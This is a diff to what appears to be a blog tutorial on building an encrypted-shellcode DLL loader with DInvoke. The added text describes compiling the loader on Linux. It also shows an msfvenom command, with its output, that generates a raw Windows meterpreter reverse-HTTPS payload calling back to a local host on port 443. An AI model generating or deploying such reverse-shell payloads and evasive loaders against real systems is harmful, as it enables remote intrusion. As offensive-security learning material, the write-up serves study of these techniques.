@@ -43,7 +43,7 @@ While desperatly googling about examples of DInvoke being used on an actual Proo
                                       S H E L L C O D E
 ```
 
-The repo consists of a shellcode encrypter which makes use of `xor` or `aes` algorithms and encrypts the file with a password using sha256.
+The repo consists of a shellcode encrypter which makes use of `xor` or `aes` algorithms and encrypts the file with a password using sha256 and the DLL project which we will be loading into the memory to execute code.
 
 - encrypter.py
 
@@ -104,4 +104,19 @@ if __name__ == '__main__':
 		with open(args.output, 'wb') as fd:
 			fd.write(enc)
 		print(f'[+] Encrypted shellcode file: {args.output}')
+```
+
+I could use Visual Studio to compile the DLL project but doing everything in linux just fits in perfectly. I wasnt aware there was a developer tool such as ``monodeveloper`` which could handle `C#` and `.NET` compiling on linux.
+
+![img1](urlhere)
+
+The walkthrough after compiling the DLL is pretty much straightforwards, I am going to create a meterpreter shellcode and have the output as raw : 
+
+```bash
+pi0x73@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_winhttps LHOST=192.168.88.142 LPORT=443 EXITFUNC=thread -f raw -o shellcode.bin
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 906 bytes
+Saved as: shellcode.bin
 ```
